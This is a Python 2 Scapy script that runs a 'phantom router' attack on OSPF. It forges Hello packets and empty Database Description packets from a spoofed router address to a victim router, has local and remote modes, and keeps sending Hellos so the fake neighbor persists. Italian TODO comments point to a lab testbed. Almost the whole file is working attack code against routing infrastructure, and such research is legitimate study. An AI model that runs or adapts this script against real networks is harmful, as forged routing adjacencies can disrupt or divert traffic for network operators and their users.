#!/usr/bin/env python

import termcolor as T # grey red green yellow blue magenta cyan white
import os
import sys
import ctypes
import datetime

from subprocess import Popen, PIPE
from scapy.all import *
from random import randint
from time import sleep
from utils import log, log2


load_contrib("ospf")


SOURCE_ADDRESS = '10.0.1.3'
DESTINATION_ADDRESS = '10.0.1.2'
HELLO_DESTINATION_MAC_ADDRESS = '01:00:5e:00:00:05'
HELLO_DESTINATION_ADDRESS = '224.0.0.5'

ATTACK_DBD_MESSAGES = 10
ATTACK_DBD_INTERVAL = 2
ATTACK_HELLO_INTERVAL = 38


HELLO_INTERVAL = 10
DEAD_INTERVAL = 40
TTL = 1 # set to a value greater than 1 in order to be forwarded towards the victim router

eight_bit_space = [1L, 2L, 4L, 8L, 16L, 32L, 64L, 128L]


def send_hello_packet(iface, srcMAC, dstMAC, srcIP, dstIP, identification_number, ttl):
	eth_header = Ether(src=srcMAC, dst=dstMAC)

	ip_header = IP(src=srcIP, dst=dstIP, ttl=ttl, proto=89)
	ip_header.id=identification_number
	# ip_header.ihl is automatically calculated, as chksum
	ip_header.tos = 12L

	ospf_header = OSPF_Hdr(\
		src='2.2.2.3')

	ospf_payload = OSPF_Hello(\
		hellointerval=HELLO_INTERVAL, \
		deadinterval=DEAD_INTERVAL,\
		mask='255.255.255.0',\
		neighbors=['2.2.2.2', '1.1.1.1'],\
		router='10.0.1.3',\
		backup='10.0.1.2',\
		options=2L) 
		# 2L = External Routing

	frame = eth_header/ip_header/ospf_header/ospf_payload

	sendp(frame, iface=iface)
	frame.show()
	log('sent hello message', 'red')

	identification_number = identification_number + 1


def send_empty_dbd_messages(iface, srcMAC, dstMAC, srcIP, dstIP, identification_number, ttl, n, interval):
	eth_header = Ether(src=srcMAC, dst=dstMAC)

	ip_header = IP(src=srcIP, dst=dstIP, ttl=ttl, proto=89)
	ip_header.tos = 12L

	seqNum = randint(0, 2147483648)

	ospf_header = OSPF_Hdr(\
		src='2.2.2.3',\
		type=2)

	ospf_payload = OSPF_DBDesc(options=2L) # 2L = E => External Routing

	frame = eth_header/ip_header/ospf_header/ospf_payload
	frame.show()

	for i in xrange(0, n):
		sleep(interval)

		frame.payload.id = identification_number
		frame.payload.payload.payload.ddseq = seqNum + i

		if i == 0:
			# 7L = I, M, MS => Init, More, Master
			frame.payload.payload.payload.dbdescr = 7L
		else:
			# 1L = MS => Master
			frame.payload.payload.payload.dbdescr = 1L

		sendp(frame, iface=iface)
		frame.show()
		log('sent dbd message %d with seqNum %d' % (i+1, seqNum + i), 'red')

		identification_number = identification_number + 1


def send_hello_packets(iface, srcMAC, dstMAC, srcIP, dstIP, identification_number, ttl, interval):

	while True:
		sleep(interval)

		send_hello_packet(iface, srcMAC, dstMAC, srcIP, dstIP, identification_number, ttl)


def main():
	remote_flag = int(sys.argv[1])
	iface = sys.argv[2]
	src_mac_address = sys.argv[3]
	dst_mac_address = sys.argv[4]

	assert remote_flag is not None
	assert iface is not None
	assert src_mac_address is not None
	assert dst_mac_address is not None

	ttl = None

	print
	if remote_flag != 1:
		ttl = TTL
		print 'performing a local attack'
	else:
		ttl = 64
		print 'performing a remote attack'
	print 'interface', iface
	print 'source MAC address', src_mac_address
	print 'destination MAC address', dst_mac_address
	print 'ttl', ttl

	# increased for each IP p. sent
	MAX_I_N = 2**15 # Identification Number - 16 bit
	identification_number = randint(MAX_I_N/4, MAX_I_N*3/4)

	# first hello message to let victim know about the phantom router
	if remote_flag != 1:
		send_hello_packet(iface, src_mac_address, HELLO_DESTINATION_MAC_ADDRESS, SOURCE_ADDRESS, HELLO_DESTINATION_ADDRESS, identification_number, ttl)
	else:
		send_hello_packet(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl)

	# empty dbd messages to let the victime send over the network its dbd updates
	send_empty_dbd_messages(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl, ATTACK_DBD_MESSAGES, ATTACK_DBD_INTERVAL)

	# hello pakets to persist the presence of the phantom router
	if remote_flag != 1:
		send_hello_packets(iface, src_mac_address, HELLO_DESTINATION_MAC_ADDRESS, SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl, ATTACK_HELLO_INTERVAL)
	else:
		send_hello_packets(iface, src_mac_address, dst_mac_address, SOURCE_ADDRESS, DESTINATION_ADDRESS, identification_number, ttl, ATTACK_HELLO_INTERVAL)

	# TODO R3 non fa il forwarding se REMOTE_ATTACK = 1
	# prova a fare un ping e 
	# confronta il pacchetto ICMP in andata da ratk a R2
	# con i pacchetti dell'attacco sempre da ratk a R2

	# TODO controlla se il secondo Hello p. va inviato dopo 40 s dal precedente o dopo 40 s dall'ultimo p. inviato

	# TODO controlla differenze tra ping e Hello p.

if __name__ == "__main__":
	main()
